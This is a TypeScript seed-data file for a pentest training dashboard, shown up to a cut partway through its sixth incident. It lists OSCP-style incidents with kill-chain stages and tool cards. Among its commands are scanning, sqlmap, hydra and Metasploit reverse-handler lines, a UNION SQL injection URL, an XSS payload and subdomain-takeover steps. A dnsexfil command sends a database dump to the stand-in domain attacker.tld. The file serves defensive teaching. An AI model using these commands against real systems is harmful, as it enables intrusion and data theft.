// PEN-200 / OSCP+ incidents — 14 enterprise-grade pentest scenarios.
// Mirrors the K8s incident shape so PentestIncidentDetail can reuse the
// same UI layout. Pure seed data — safe to import anywhere.

import type {
  PentestIncident, PentestConcept, KillChainNode, AttackToolCard,
} from "./types";

const iso = (minsAgo: number) => new Date(Date.now() - minsAgo * 60_000).toISOString();

/* =====================================================================
 * Shared kill-chain flows — reused across incidents, with active_stage_id
 * overridden per incident.
 * ===================================================================== */

const KILL_CHAIN_FULL: KillChainNode[] = [
  { id: "scope",     label: "Scope",     def: "Engagement letter, IP ranges, time windows and exclusions.",
    attacker_goal: "Confirm the box is in-scope before touching it — out-of-scope traffic is a contract breach.",
    defender_signal: "Procurement / legal have an authorisation letter on file.",
    tools: ["report-template"] },
  { id: "recon",     label: "Recon",     def: "Build the attack surface map: subdomains, ports, banners, content.",
    attacker_goal: "Catalogue every reachable service, version and parameter.",
    defender_signal: "Spike of SYN scans from a single source IP; nmap fingerprint in IDS logs.",
    tools: ["nmap", "amass", "subfinder", "gobuster", "ffuf", "smbclient", "enum4linux", "dig"] },
  { id: "weaponize", label: "Weaponize", def: "Locate, modify or craft the exploit / payload for a discovered weakness.",
    attacker_goal: "Have a working PoC + delivery mechanism before knocking on the door.",
    defender_signal: "Hard to detect — happens off-box. Threat intel feeds for new CVE PoCs help.",
    tools: ["searchsploit", "msfvenom", "burp"] },
  { id: "deliver",   label: "Deliver",   def: "Get the payload to the target — HTTP POST, phishing link, upload form, RDP paste.",
    attacker_goal: "Smuggle the payload past WAF / mail filters.",
    defender_signal: "Anomalous outbound DNS / HTTP from an internal host; suspicious attachments.",
    tools: ["curl", "burp"] },
  { id: "exploit",   label: "Exploit",   def: "Trigger the vulnerability and execute code in the target's context.",
    attacker_goal: "Achieve initial code execution or auth bypass.",
    defender_signal: "Web logs show malformed parameters; process tree shows shell from web user.",
    tools: ["sqlmap", "msfconsole", "hydra", "curl", "burp"] },
  { id: "install",   label: "Install",   def: "Drop a persistent foothold — webshell, reverse shell, scheduled task.",
    attacker_goal: "Survive reboots, session timeouts and EDR sweeps.",
    defender_signal: "New file in web root; unexpected service or cron entry.",
    tools: ["msfvenom", "kali-shell"] },
  { id: "c2",        label: "C2",        def: "Persistent command-and-control channel (Meterpreter, evil-winrm, beacon).",
    attacker_goal: "Reliable two-way comms through whatever egress exists.",
    defender_signal: "Beaconing pattern (jittered HTTPS to a low-rep domain).",
    tools: ["msfconsole", "evil-winrm", "kali-shell"] },
  { id: "action",    label: "Action on Objectives", def: "Loot, pivot, escalate.",
    attacker_goal: "Achieve engagement goals (DA, sensitive data exfil, app takeover).",
    defender_signal: "Unusual lateral SMB / WinRM, mass file reads, mimikatz signatures.",
    tools: ["hashcat", "john", "ntlmrelayx", "smbclient"] },
  { id: "cleanup",   label: "Cleanup",   def: "Remove transient artifacts; document persistence that the client must clean up.",
    attacker_goal: "Leave the box in a defensible state without erasing forensic evidence the client needs.",
    defender_signal: "Truncated logs / wevtutil clear-log calls = red flag.",
    tools: ["kali-shell"] },
  { id: "report",    label: "Report",    def: "Finding written up with CVSS, evidence and prioritised remediation.",
    attacker_goal: "Deliver business value — the report is the only deliverable the client keeps.",
    defender_signal: "Findings tracked in JIRA / vuln backlog with owners and ETAs.",
    tools: ["report-template"] },
];

/* Shared tool cards — picked subset per incident. */
const TOOL_CARDS: Record<string, AttackToolCard> = {
  nmap: {
    name: "nmap", category: "recon",
    definition: "Port and service scanner with NSE scripting engine.",
    why_pentesters_use_it: "It is the universal first move on any external or internal engagement — version banners directly drive exploit lookups.",
    beginner_view: "Type 'nmap target' and read the open-port list. Each port is a door.",
    advanced_view: "Tune timing (-T2 for IDS evasion, -T4 for lab), combine -sC -sV -sU and pipe to NSE scripts (vuln, ssl-enum-ciphers, smb-os-discovery).",
    commands: [
      { cmd: "nmap -sV -sC -p- 10.10.10.5 -oA full", expected: "PORT STATE SERVICE VERSION\\n22/tcp open ssh OpenSSH 8.4p1\\n80/tcp open http Apache 2.4.52\\n..." },
      { cmd: "nmap --script vuln 10.10.10.5", expected: "PORT   STATE SERVICE\\n80/tcp open  http\\n| http-csrf: ..." },
    ],
    oscp_relevance: "OSCP+ marks any host enumeration incomplete without an all-ports + version scan.",
    related_incidents: ["PEN-INC-3001", "PEN-INC-3002", "PEN-INC-3003"],
  },
  gobuster: {
    name: "gobuster", category: "recon",
    definition: "Multi-mode brute forcer: dir, dns, vhost, fuzz.",
    why_pentesters_use_it: "Hidden /admin or /backup paths are still the #1 web foothold.",
    beginner_view: "Give it a URL and a wordlist; it tells you what other URLs exist.",
    advanced_view: "Use -x for extensions (php, asp, txt), -k to ignore TLS errors, recursion via wfuzz for staged dirs.",
    commands: [
      { cmd: "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt", expected: "/admin (Status: 301)\\n/login.php (Status: 200)\\n/backup (Status: 403)" },
    ],
    oscp_relevance: "Every OSCP+ web box has at least one undiscoverable-by-eyeball path that gobuster reveals.",
    related_incidents: ["PEN-INC-5001", "PEN-INC-5002"],
  },
  sqlmap: {
    name: "sqlmap", category: "exploit",
    definition: "Automated SQLi detection and exploitation framework.",
    why_pentesters_use_it: "Converts a 'this parameter looks injectable' hunch into a full DB dump in minutes.",
    beginner_view: "Give it a URL with a parameter; it tells you if SQLi exists and dumps the DB.",
    advanced_view: "Tune --risk 3 --level 5, use --tamper for WAF bypass, --os-shell for RCE on MySQL with FILE priv.",
    commands: [
      { cmd: "sqlmap -u 'http://t/p?id=1' --batch --dbs", expected: "[*] available databases:\\n[*] information_schema\\n[*] shop" },
      { cmd: "sqlmap -u ... -D shop -T users --dump", expected: "Database: shop\\nTable: users\\n+----+--------+-----------+" },
    ],
    oscp_relevance: "SQLi appears on roughly half of OSCP+ web boxes — sqlmap is the canonical tool.",
    related_incidents: ["PEN-INC-7001", "PEN-INC-7002"],
  },
  burp: {
    name: "burp", category: "exploit",
    definition: "Intercepting HTTP proxy with Repeater, Intruder and Scanner.",
    why_pentesters_use_it: "Every non-trivial web exploit needs byte-level control of headers and bodies.",
    beginner_view: "Sits between your browser and the server so you can edit every request.",
    advanced_view: "Match-and-replace rules for session handling, Intruder cluster bomb attacks, BApp extensions (Autorize, JWT-Editor).",
    commands: [
      { cmd: "curl -x 127.0.0.1:8080 http://target/login", expected: "Request appears in Burp Proxy → HTTP history." },
    ],
    oscp_relevance: "Repeater is mandatory for IDOR, SQLi tweaking and auth bypass on OSCP+.",
    related_incidents: ["PEN-INC-5002", "PEN-INC-6001", "PEN-INC-7002"],
  },
  curl: {
    name: "curl", category: "auxiliary",
    definition: "Scriptable HTTP client.",
    why_pentesters_use_it: "Provides a one-liner PoC the client can paste and reproduce.",
    beginner_view: "Send any HTTP request from the terminal.",
    advanced_view: "Use --resolve for vhost testing, -H for header injection, --data-binary for raw POST bodies.",
    commands: [
      { cmd: "curl -i -H 'X-Forwarded-For: 127.0.0.1' http://target/admin", expected: "HTTP/1.1 200 OK\\n..." },
    ],
    oscp_relevance: "OSCP+ report findings must include a reproducible curl PoC.",
    related_incidents: ["PEN-INC-5002", "PEN-INC-6002", "PEN-INC-7001"],
  },
  msfconsole: {
    name: "msfconsole", category: "exploit",
    definition: "Metasploit Framework console.",
    why_pentesters_use_it: "Reliable exploits + Meterpreter for post-ex pivoting.",
    beginner_view: "Pick an exploit, set the target, run it.",
    advanced_view: "Workspace per engagement, db_nmap for asset DB, post modules for token impersonation and hashdump.",
    commands: [
      { cmd: "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; run'", expected: "[*] Started HTTPS reverse handler on https://0.0.0.0:8443" },
    ],
    oscp_relevance: "OSCP+ allows ONE Metasploit auto-exploit during the exam — pick wisely.",
    related_incidents: ["PEN-INC-6003"],
  },
  hydra: {
    name: "hydra", category: "cracking",
    definition: "Network credential brute-forcer.",
    why_pentesters_use_it: "Spray weak credentials across SSH / RDP / HTTP forms.",
    beginner_view: "Give it a user list, a password list, and a protocol.",
    advanced_view: "-t for thread count, -e nsr for null/same/reverse, http-post-form for custom apps.",
    commands: [
      { cmd: "hydra -L users.txt -P rockyou.txt ssh://10.10.10.5", expected: "[22][ssh] host: 10.10.10.5 login: oscp password: superman" },
    ],
    oscp_relevance: "Hydra is rate-limited on OSCP+ — use only after enumeration is exhausted.",
    related_incidents: ["PEN-INC-3002"],
  },
  smbclient: {
    name: "smbclient", category: "recon",
    definition: "CLI SMB share enumerator and downloader.",
    why_pentesters_use_it: "Anonymous shares regularly contain clear-text creds.",
    beginner_view: "List shares (-L), then download interesting files.",
    advanced_view: "Combine with crackmapexec for spraying, or smbmap for bulk enumeration.",
    commands: [
      { cmd: "smbclient -L //10.10.10.5 -N", expected: "Sharename  Type  Comment\\nbackups    Disk  Nightly DB dumps  <-- READABLE" },
    ],
    oscp_relevance: "Anonymous SMB is the most-found low-hanging fruit on internal AD pentests.",
    related_incidents: ["PEN-INC-3002"],
  },
  "report-template": {
    name: "report-template", category: "reporting",
    definition: "Markdown / Word finding template with CVSS, repro steps and evidence layout.",
    why_pentesters_use_it: "The report is the only deliverable the client keeps — structure matters.",
    beginner_view: "Fill in title, severity, description, steps to reproduce, evidence, remediation.",
    advanced_view: "Auto-generate appendix from tool output (nmap XML → tables), include CVSS-vector strings.",
    commands: [
      { cmd: "pandoc finding.md --pdf-engine=xelatex -o finding.pdf", expected: "finding.pdf created (12 pages)." },
    ],
    oscp_relevance: "Reports submitted without CVSS vector strings risk OSCP+ rejection.",
    related_incidents: ["PEN-INC-2001", "PEN-INC-2002"],
  },
};

/* Helpers to compose concepts compactly. */
function concept(opts: {
  concept: string; definition: string; why_it_exists: string;
  blue_team_view: string; beginner: string; engineer: string;
  active_stage_id: string; tool_keys: string[];
  learn_more: { question: string; answer: string }[];
}): PentestConcept {
  return {
    concept: opts.concept, definition: opts.definition, why_it_exists: opts.why_it_exists,
    blue_team_view: opts.blue_team_view, beginner: opts.beginner, engineer: opts.engineer,
    kill_chain_flow: KILL_CHAIN_FULL, active_stage_id: opts.active_stage_id,
    tools: opts.tool_keys.map((k) => TOOL_CARDS[k]).filter(Boolean),
    learn_more: opts.learn_more,
  };
}

/* =====================================================================
 * The 14 incidents
 * ===================================================================== */

export const PEN_INCIDENTS: PentestIncident[] = [

  // ============== Module 1 ===============
  {
    id: "PEN-INC-1001",
    title: "Rules of engagement violated — scan touched out-of-scope /24",
    severity: "high", status: "open", owner: "lead-pentester",
    engagement: "ACME-2026-Q2", target_scope: "10.10.10.0/24", target: "10.10.11.42",
    module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity & Pentester Mindset",
    detected_at: iso(20), last_event_at: iso(2),
    kill_chain: "Scope → Recon (violation)", current_phase: "scope", reached_phases: ["scope", "recon"],
    briefing: {
      who: "Junior consultant operating from kali-jump-01.",
      what: "An `nmap -sV 10.10.0.0/16` scan included 12 hosts in 10.10.11.0/24 — outside the signed scope.",
      where: "Client AD subnet, prod tier.",
      when: `${iso(20)} — 20 minutes ago, 1,840 packets sent.`,
      why: "CIDR copy-paste error: scope was /24 but operator used /16 muscle memory.",
      how: "Suricata at the client perimeter alerted on SYN burst from kali-jump-01 to 10.10.11.0/24.",
      severity_rationale: "HIGH — contractual breach. Even though no exploitation occurred, the client SOC raised an incident and pentest authorisation may be suspended.",
    },
    description: "An nmap scan was launched against an incorrect CIDR, sweeping 256 hosts that fell outside the agreed Rules of Engagement. No exploitation followed, but the client SOC has paged the engagement lead.",
    original_event: `# kali-jump-01:~ $ history | tail
  nmap -sV -T4 10.10.0.0/16 -oA wide-sweep
[!] Suricata alert (client SOC):
  ET SCAN Nmap Scripting Engine User-Agent observed
  src=198.51.100.42 dst=10.10.11.42 sport=54221 dport=443
  count=1840 in 12s
[!] Engagement letter clause 3.2: in-scope = 10.10.10.0/24 only.`,
    affected: [
      { kind: "Host", name: "10.10.11.0/24", detail: "256 hosts swept, 12 responded", action: "Notify client immediately; quarantine scan output.", severity: "high" },
      { kind: "Account", name: "kali-jump-01 / consultant-b", detail: "Operator account flagged by SOC", action: "Pause activity, document timestamps.", severity: "medium" },
    ],
    aligned_tools: ["nmap", "kali-shell", "report-template"],
    data_sources: ["bash-history", "suricata", "soc-pager", "ROE"],
    logs_sample: `[suricata] 1:2009358 ET SCAN Nmap Scripting Engine src=198.51.100.42 dst=10.10.11.42
[suricata] 1:2009582 ET SCAN Potential SYN Flood src=198.51.100.42 dport=443 count>1000/min
[bash-history] nmap -sV -T4 10.10.0.0/16 -oA wide-sweep`,
    metrics_sample: `engagement_in_scope_hosts        256
engagement_oos_hosts             256  <-- violation
client_soc_alerts_raised           4
ROE_authorisation                  REVIEW_PENDING`,
    response_actions: ["Notify client lead", "Pause engagement", "Delete OOS data", "Update RoE checklist"],
    next_steps: [
      { level: "L1", text: "Stop all active scanning immediately; document last command and timestamp." },
      { level: "L2", text: "Notify client engagement lead within 1 hour with the OOS host list." },
      { level: "L3", text: "Add a pre-flight CIDR validator script to every operator's .zshrc." },
    ],
    lab_slug: "pen200-rules-of-engagement",
    concept: concept({
      concept: "Rules of Engagement & Scope Discipline",
      definition: "Contractual document defining authorised targets, allowed techniques, time windows and notification paths.",
      why_it_exists: "Pentesters operate under the Computer Misuse Act / CFAA — unauthorised packets are crimes. The RoE is your legal shield.",
      blue_team_view: "SOC analysts must know an engagement is in flight; without the RoE they will respond as a real incident.",
      beginner: "Before sending a single packet, confirm the IP is in the signed scope document. If unsure, ask.",
      engineer: "Encode the scope as a hosts file or nmap exclude list and reference it from every wrapper script. Treat scope as code.",
      active_stage_id: "scope",
      tool_keys: ["nmap", "kali-shell", "report-template"],
      learn_more: [
        { question: "What MUST appear in a Rules of Engagement document?", answer: "Scope (IPs/URLs), allowed techniques, exclusions, time windows, emergency contacts, data-handling rules and authorisation signature." },
        { question: "What do you do the moment you realise you scanned out-of-scope?", answer: "Stop. Document. Notify client. Delete OOS data. File an internal incident. Continue only after written authorisation." },
        { question: "How do experienced operators prevent this?", answer: "Pre-flight scripts validate every target against a scope file; nmap is wrapped with --excludefile; CI gates on RoE violations." },
      ],
    }),
  },

  {
    id: "PEN-INC-1002",
    title: "Out-of-band exfil channel triggered EDR — engagement loud",
    severity: "medium", status: "in_progress", owner: "lead-pentester",
    engagement: "ACME-2026-Q2", target_scope: "10.10.10.0/24", target: "10.10.10.18",
    module: "PEN-M1", module_title: "M1 · Intro to Cybersecurity & Pentester Mindset",
    detected_at: iso(45), last_event_at: iso(6),
    kill_chain: "Recon → Action (loud)", current_phase: "action", reached_phases: ["recon", "exploit", "action"],
    briefing: {
      who: "Senior consultant on internal segment.",
      what: "Used `nslookup` + dnsexfil PoC to exfil a 4MB DB dump; CrowdStrike Falcon raised a high-confidence beaconing alert.",
      where: "Internal AD lab subnet 10.10.10.18 (Win11).",
      when: `${iso(45)} — 45m ago. Beaconing every 7s for 12 minutes.`,
      why: "Operator chose DNS exfil to bypass HTTPS proxy without testing if EDR baseline included DNS-rate detection.",
      how: "Falcon flagged 102 DNS TXT queries to .attacker.tld in 60s — out of profile for the host.",
      severity_rationale: "MEDIUM — engagement is still authorised, but stealth is gone. Reset expectations with client and pivot to noisier methodology.",
    },
    description: "An attempted covert exfil produced a clear EDR alert. The engagement should switch from red-team stealth posture to traditional pentest posture (assumed-breach style).",
    original_event: `[Falcon] 2026-05-29 06:13:22Z severity=HIGH host=ws-1018 detect=Suspicious DNS Tunneling
  - 102 TXT queries to *.attacker.tld in 60s
  - Avg label length 53 bytes (base32 pattern)
  - Process: powershell.exe (parent: explorer.exe)
[bash] dnsexfil --tld attacker.tld --base32 -f dump.sql.gz --rate 7s`,
    affected: [
      { kind: "Host", name: "ws-1018 (10.10.10.18)", detail: "EDR isolation pending", action: "Coordinate with client SOC before isolation impacts users.", severity: "medium" },
      { kind: "Domain", name: "attacker.tld", detail: "Burned for this engagement", action: "Rotate to fresh domain for next phase.", severity: "low" },
    ],
    aligned_tools: ["kali-shell", "report-template"],
    data_sources: ["edr-falcon", "dns-logs", "bash-history"],
    logs_sample: `[falcon] DNS TUNNELING signal 0.96
[falcon] process tree: explorer.exe -> powershell.exe -> nslookup.exe x202 in 60s
[unbound] response NXDOMAIN A1B2.attacker.tld TXT`,
    metrics_sample: `dns_queries_per_min{host=ws-1018}     612  (baseline 8)
edr_detection_score                   0.96
operator_stealth_budget               EXHAUSTED`,
    response_actions: ["Inform client SOC", "Switch to assumed-breach mode", "Rotate exfil domain", "Document IOCs for purple team"],
    next_steps: [
      { level: "L1", text: "Halt exfil; do not retry on the same domain." },
      { level: "L2", text: "Brief client SOC; convert the detection into a purple-team artefact." },
      { level: "L3", text: "Update methodology: profile EDR DNS rate limits before tunneling." },
    ],
    lab_slug: "pen200-kali-tour",
    concept: concept({
      concept: "Operational Security (OPSEC) & Detection Awareness",
      definition: "Discipline of minimising the attacker footprint such that defenders cannot reliably attribute activity.",
      why_it_exists: "Modern EDR catches noisy techniques. A stealthy engagement produces realistic findings; a loud one becomes a tabletop exercise.",
      blue_team_view: "Defenders should configure EDR for DNS-rate anomalies, base32/hex patterns and TXT-record floods.",
      beginner: "Every command leaves traces. Think about who sees the packet before you send it.",
      engineer: "Profile detection before you act: time, volume, parent process, registry/file system side effects. Use canary techniques to probe rule sets.",
      active_stage_id: "action",
      tool_keys: ["nmap", "kali-shell"],
      learn_more: [
        { question: "What are common detection signals for DNS exfil?", answer: "High query rate, base32/hex labels, long subdomains, TXT/NULL record types, queries to new domains." },
        { question: "How do you exfil without DNS?", answer: "ICMP, HTTPS to CDN-fronted domain, legitimate cloud services (Slack, Dropbox), DOH to public resolvers." },
        { question: "When is loud OK?", answer: "Vulnerability assessment / standard pentest. Red team = stealth-first; pentest = coverage-first." },
      ],
    }),
  },

  // ============== Module 2 ===============
  {
    id: "PEN-INC-2001",
    title: "Critical finding shipped without CVSS vector string",
    severity: "medium", status: "open", owner: "report-reviewer",
    engagement: "ACME-2026-Q2", target_scope: "report PDF", target: "Finding F-014 (SQLi)",
    module: "PEN-M2", module_title: "M2 · Pentest Report Writing",
    detected_at: iso(60), last_event_at: iso(60),
    kill_chain: "Report (incomplete)", current_phase: "report", reached_phases: ["report"],
    briefing: {
      who: "Pentest report v0.9 prepared by consultant-a, reviewed by QA.",
      what: "Finding F-014 (UNION-based SQLi → DB dump) is marked Critical but ships with no CVSS v3.1 vector string and no quantitative score.",
      where: "Section 4.3 of the engagement report.",
      when: `${iso(60)} — caught at QA review, 1h before client send.`,
      why: "Author marked severity by gut feel; template's CVSS box was left blank.",
      how: "QA reviewer ran `grep -i 'cvss' report.md` → 0 hits in F-014.",
      severity_rationale: "MEDIUM — won't break the engagement, but blocks the client's vuln intake which requires a CVSS vector to ingest into JIRA.",
    },
    description: "A critical SQLi finding has no machine-readable CVSS vector string, which prevents automated ticketing on the client side and risks OSCP+-style report rejection.",
    original_event: `## F-014 — SQL Injection in /products?id=
**Severity:** Critical
**CVSS v3.1:**            <-- BLANK
**Affected:** http://shop.acme.local/products?id=
**Reproduction:**
  curl 'http://shop.acme.local/products?id=1 UNION SELECT 1,2,3-- -'
**Evidence:** dumped 4 user rows incl. admin bcrypt hash`,
    affected: [
      { kind: "URL", name: "Finding F-014", detail: "Severity Critical, no CVSS vector", action: "Add CVSS v3.1 vector string and base score.", severity: "medium" },
    ],
    aligned_tools: ["report-template"],
    data_sources: ["report-md", "qa-checklist"],
    logs_sample: `[qa] grep -n 'CVSS' report.md
  4.3:**CVSS v3.1:**
  (no vector follows)
[qa] checklist item 3.1 'CVSS vector present' = FAIL`,
    metrics_sample: `findings_total                      14
findings_missing_cvss                1
findings_missing_repro               0
qa_blockers                          1`,
    response_actions: ["Compute CVSS vector", "Update template", "Re-run QA grep", "Train author"],
    next_steps: [
      { level: "L1", text: "Compute the vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = base 9.8 (Critical)." },
      { level: "L2", text: "Add vector + score to F-014; rerun QA checklist." },
      { level: "L3", text: "Make CVSS a mandatory template field — fail CI if blank." },
    ],
    lab_slug: "pen200-cvss-score",
    concept: concept({
      concept: "CVSS v3.1 Scoring",
      definition: "Common Vulnerability Scoring System — standardised 0.0–10.0 base score derived from a vector string capturing exploitability and impact metrics.",
      why_it_exists: "Lets clients triage hundreds of findings consistently across tools and consultancies.",
      blue_team_view: "Defenders sort the backlog by score; without a vector, automated ingest fails.",
      beginner: "Pick metric values from the calculator at first.org/cvss. Copy the vector string into your finding.",
      engineer: "Always include vector AND environmental score if you know client context. Document tie-breakers (e.g. PR:L vs PR:N).",
      active_stage_id: "report",
      tool_keys: ["report-template"],
      learn_more: [
        { question: "What does AV:N/AC:L mean?", answer: "Attack Vector: Network (remote, no local access), Attack Complexity: Low (no special conditions)." },
        { question: "Why ship a vector instead of just a number?", answer: "The vector is the audit trail — anyone can recompute the score and challenge specific metric choices." },
        { question: "When do you use environmental score?", answer: "When you know the client's actual asset criticality, e.g. CR:H for a payment processor's DB." },
      ],
    }),
  },

  {
    id: "PEN-INC-2002",
    title: "Finding rejected — reproduction steps missing target snapshot ID",
    severity: "low", status: "in_progress", owner: "report-reviewer",
    engagement: "ACME-2026-Q2", target_scope: "report PDF", target: "Finding F-007 (XSS)",
    module: "PEN-M2", module_title: "M2 · Pentest Report Writing",
    detected_at: iso(120), last_event_at: iso(40),
    kill_chain: "Report (irreproducible)", current_phase: "report", reached_phases: ["report"],
    briefing: {
      who: "Client developer triaging finding F-007.",
      what: "Reflected XSS PoC URL no longer fires — devs cannot reproduce, finding flagged 'cannot verify'.",
      where: "/search?q= endpoint on staging.acme.local.",
      when: `${iso(120)} — original repro 2h ago; staging was redeployed since.`,
      why: "Reproduction steps assumed the live staging environment; no app version / git SHA captured.",
      how: "Developer ran the curl PoC, got 200 OK without alert(), assumed false positive.",
      severity_rationale: "LOW — finding is real but the report's evidence is now non-reproducible, eroding trust in the engagement.",
    },
    description: "A perfectly valid XSS finding cannot be confirmed by the client because the report didn't pin the application version. Capture environmental context with every PoC.",
    original_event: `## F-007 — Reflected XSS in /search?q=
**PoC:** curl 'http://staging.acme.local/search?q=<script>alert(1)</script>'
**Evidence:** screenshot 'xss-popup.png' captured at 04:12Z
**App version:**            <-- BLANK
**Git SHA / build #:**       <-- BLANK
[dev] redeploy at 05:01Z (commit abc123) — sanitizer added accidentally`,
    affected: [
      { kind: "URL", name: "/search?q=", detail: "PoC no longer fires on current build", action: "Re-test on git tag captured at engagement start.", severity: "low" },
    ],
    aligned_tools: ["curl", "report-template"],
    data_sources: ["report-md", "client-comms", "git-log"],
    logs_sample: `[client-email] 'We tried the PoC URL — page returns normally, no alert popup'
[git-log] abc123 fix(search): sanitize query parameter (accidental)`,
    metrics_sample: `findings_with_version_pin            8 / 14
findings_disputed_by_client          1
mean_repro_success_rate           71%`,
    response_actions: ["Pin app version in template", "Capture HAR + cookie", "Re-test on pinned build", "Update report"],
    next_steps: [
      { level: "L1", text: "Re-run PoC against build sha abc122 (pre-fix); capture screenshot." },
      { level: "L2", text: "Update F-007 with version + build # fields filled in." },
      { level: "L3", text: "Make 'version captured' a mandatory checklist item before PoC submission." },
    ],
    lab_slug: "pen200-write-finding",
    concept: concept({
      concept: "Reproducibility of Findings",
      definition: "Every finding must include sufficient context (version, time, user, payload, environment) for the client to reproduce it on demand.",
      why_it_exists: "Clients fix what they can verify. Unreproducible findings get downgraded or closed as 'cannot reproduce'.",
      blue_team_view: "Triagers cross-check the PoC against the live build. If the PoC doesn't fire, the finding is parked.",
      beginner: "Always capture the app version, the URL, the headers and a screenshot.",
      engineer: "Use HAR files, curl one-liners, and Burp project files. Pin to a git SHA or container image digest.",
      active_stage_id: "report",
      tool_keys: ["curl", "report-template"],
      learn_more: [
        { question: "What's the minimum context to capture?", answer: "URL, method, headers, body, response code/body excerpt, app version or git SHA, time, user account used." },
        { question: "What format is best for repro evidence?", answer: "curl one-liner + Burp Repeater export + screenshot. Three independent vectors." },
        { question: "How do you handle a moving target staging env?", answer: "Snapshot the container or pin the commit SHA at engagement start; ask the client to keep it available for retest." },
      ],
    }),
  },

  // ============== Module 3 ===============
  {
    id: "PEN-INC-3001",
    title: "Subdomain takeover — dangling CNAME points to deleted S3 bucket",
    severity: "critical", status: "open", owner: "external-pentester",
    engagement: "ACME-2026-Q2", target_scope: "*.acme.com", target: "promos.acme.com",
    module: "PEN-M3", module_title: "M3 · Information Gathering",
    detected_at: iso(25), last_event_at: iso(3),
    kill_chain: "Recon → Action", current_phase: "action", reached_phases: ["recon", "weaponize", "exploit", "action"],
    briefing: {
      who: "External recon operator, kali-cloud-01.",
      what: "amass + dig identified `promos.acme.com` as a CNAME to `acme-promos-2019.s3.amazonaws.com` — the bucket is deleted and re-claimable.",
      where: "Public DNS for acme.com.",
      when: `${iso(25)} — confirmed via subzy 25m ago; PoC bucket claimed 3m ago.`,
      why: "Marketing decommissioned the bucket without removing the CNAME (DNS hygiene gap).",
      how: "amass enum → CNAME lookup → AWS error 'NoSuchBucket' → re-create bucket with same name → serve attacker content under acme.com.",
      severity_rationale: "CRITICAL — attacker can host phishing pages and harvest cookies under a trusted *.acme.com origin, bypassing SameSite + DMARC entirely.",
    },
    description: "promos.acme.com is a dangling CNAME pointing at a deleted S3 bucket. Anyone can re-create the bucket and serve content on a fully-trusted ACME subdomain.",
    original_event: `$ amass enum -passive -d acme.com | grep promos
promos.acme.com  CNAME  acme-promos-2019.s3.amazonaws.com

$ dig +short promos.acme.com
acme-promos-2019.s3.amazonaws.com.

$ curl -sI http://promos.acme.com/
HTTP/1.1 404 Not Found
Server: AmazonS3
x-amz-request-id: ...
<Error><Code>NoSuchBucket</Code></Error>

$ subzy run --target promos.acme.com
[VULNERABLE] promos.acme.com -> AWS/S3 (NoSuchBucket)`,
    affected: [
      { kind: "Domain", name: "promos.acme.com", detail: "Dangling CNAME → deleted S3 bucket", action: "Remove CNAME from DNS; OR re-create bucket in ACME's account.", severity: "critical" },
      { kind: "Account", name: "marketing-aws-prod", detail: "Owns the original bucket lifecycle", action: "Audit all *.acme.com CNAMEs for orphaned targets.", severity: "high" },
    ],
    aligned_tools: ["amass", "subfinder", "dig", "curl", "report-template"],
    data_sources: ["passive-dns", "crt.sh", "aws-public-api"],
    logs_sample: `[amass] enum -passive -d acme.com discovered 412 subdomains
[crt.sh] promos.acme.com first seen 2019-04-02
[aws-s3] HEAD bucket acme-promos-2019 -> 404 NoSuchBucket
[subzy] promos.acme.com vulnerable AWS/S3`,
    metrics_sample: `subdomains_total                      412
subdomains_with_cname                  87
dangling_cnames                         3   <-- finding!
takeover_PoC_claimed                    1
trusted_origin_impact                  HIGH`,
    response_actions: ["Claim bucket (PoC)", "Notify client immediately", "Audit all CNAMEs", "Add DNS-decom checklist"],
    next_steps: [
      { level: "L1", text: "Capture PoC: claim bucket, upload PoC.html, screenshot acme-branded page." },
      { level: "L2", text: "Notify client engagement lead within 1h — this needs same-day mitigation." },
      { level: "L3", text: "Recommend automated daily subdomain takeover scanning (subjack/subzy in CI)." },
    ],
    lab_slug: "pen200-subdomain-enum",
    concept: concept({
      concept: "Subdomain Takeover via Dangling CNAME",
      definition: "Vulnerability where a DNS CNAME points to a third-party service resource that no longer exists, allowing anyone to re-claim that resource and serve content on the trusted subdomain.",
      why_it_exists: "DNS records outlive cloud resources. Orgs decommission S3 buckets / Heroku apps / Azure CDN endpoints but forget the matching DNS entry.",
      blue_team_view: "Run daily subdomain takeover scanners (subzy, subjack). Treat DNS as code — every cloud resource decom must include a DNS PR.",
      beginner: "A subdomain like promos.acme.com points elsewhere via CNAME. If that 'elsewhere' is gone, an attacker can re-create it with the same name and serve any content under acme.com.",
      engineer: "Pipeline: amass → dnsx CNAME lookup → service fingerprint (S3/Heroku/Azure/GH-Pages) → check service-specific 'not found' indicator → claim → PoC.",
      active_stage_id: "recon",
      tool_keys: ["nmap", "curl", "report-template"],
      learn_more: [
        { question: "Which cloud services are most often vulnerable?", answer: "AWS S3, GitHub Pages, Azure CDN, Heroku, Fastly, Shopify, Tumblr — any service that lets users claim arbitrary names." },
        { question: "How does an attacker monetise this?", answer: "Phishing under a trusted origin, cookie theft (if SameSite=Lax), bypassing CORS/CSP whitelists that trust *.target.com." },
        { question: "What's the ethical PoC?", answer: "Claim the resource, upload a single text file ('owned by acme-pentest-2026'), screenshot, then release the resource." },
      ],
    }),
  },

  {
    id: "PEN-INC-3002",
    title: "Anonymous SMB enumeration leaked clear-text DB credentials",
    severity: "high", status: "in_progress", owner: "internal-pentester",
    engagement: "ACME-2026-Q2", target_scope: "10.10.10.0/24", target: "10.10.10.5",
    module: "PEN-M3", module_title: "M3 · Information Gathering",
    detected_at: iso(35), last_event_at: iso(4),
    kill_chain: "Recon → Action", current_phase: "action", reached_phases: ["recon", "exploit", "action"],
    briefing: {
      who: "Internal pentester on kali-internal-02.",
      what: "Anonymous SMB enumeration found the `backups` share readable; `backups/db.bak.txt` contains clear-text MSSQL sa credentials.",
      where: "fs01.acme.local (10.10.10.5), SMB share 'backups'.",
      when: `${iso(35)} — credentials extracted 4 minutes ago.`,
      why: "Backup script writes credentials to a plaintext header for ops convenience; share permissions allow Everyone:Read.",
      how: "smbclient -L -N → enum4linux → smbget backups/db.bak.txt → grep 'sa='.",
      severity_rationale: "HIGH — sa is a sysadmin equivalent on MSSQL; from here, xp_cmdshell yields SYSTEM on the DB host.",
    },
    description: "An anonymously-readable SMB share on the file server exposes a backup configuration file that contains the MSSQL sa account password in plaintext.",
    original_event: `$ smbclient -L //10.10.10.5 -N
        Sharename       Type      Comment
        ---------       ----      -------
        backups         Disk      Nightly DB dumps
        IPC$            IPC       IPC Service
$ smbclient //10.10.10.5/backups -N
smb: \\> get db.bak.txt
